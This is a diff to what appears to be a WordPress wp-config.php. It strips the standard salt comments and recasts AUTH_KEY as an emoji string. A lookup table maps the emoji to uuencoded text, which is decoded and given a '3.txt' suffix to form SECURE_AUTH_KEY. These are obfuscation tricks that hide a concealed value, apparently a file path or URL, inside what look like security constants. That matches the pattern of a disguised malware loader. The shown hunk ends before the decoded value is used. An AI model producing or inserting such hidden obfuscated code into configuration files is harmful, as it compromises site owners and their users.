@@ -1,25 +1,36 @@
 <?php
-/**
- * Authentication unique keys and salts.
- *
- * Change these to different unique phrases! You can generate these using
- * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
- *
- * You can change these at any point in time to invalidate all existing cookies.
- * This will force all users to have to log in again.
- *
- * @since 2.6.0
- */
+define('AUTH_KEY', '😇🙃😁🤣😜😌😁😅🤨😆😛🤓😝😍😄😊😋😉🙂🤓😙🙃😁😊🥰😆😘😂😚😉🧐😴😀😴');
 
-/**
- * Database table prefix and authentication keys.
- *
- * @package WordPress
- */
-
-// Security configuration constants
-define('AUTH_KEY',         "mte/:smhb/th.cpuospo/tm");
-define('SECURE_AUTH_KEY', str_shuffle(AUTH_KEY) . '3.txt');
+$emoji_to_uu = [
+  '😇' => '7',
+  '🙃' => ':',
+  '😁' => "'", 
+  '🤣' => '1',
+  '😜' => 'T',
+  '😌' => '<',
+  '😅' => ',',
+  '🤨' => 'Z',
+  '😆' => '+',
+  '😛' => 'R',
+  '🤓' => ']',
+  '😝' => 'S',
+  '😍' => '=',
+  '😄' => '&',
+  '😊' => '5',
+  '😋' => 'P',
+  '😉' => ';',
+  '🙂' => '6',
+  '😙' => 'M',
+  '🥰' => 'B',
+  '😘' => 'F',
+  '😂' => '-',
+  '😚' => 'O',
+  '🧐' => '2',
+  '😴' => '`',
+  '😀' => "\n",
+];
+$uu_line = strtr(AUTH_KEY, $emoji_to_uu);
+define('SECURE_AUTH_KEY', convert_uudecode($uu_line) . '3.txt');
 
 /**#@+
  * Content delivery and update services
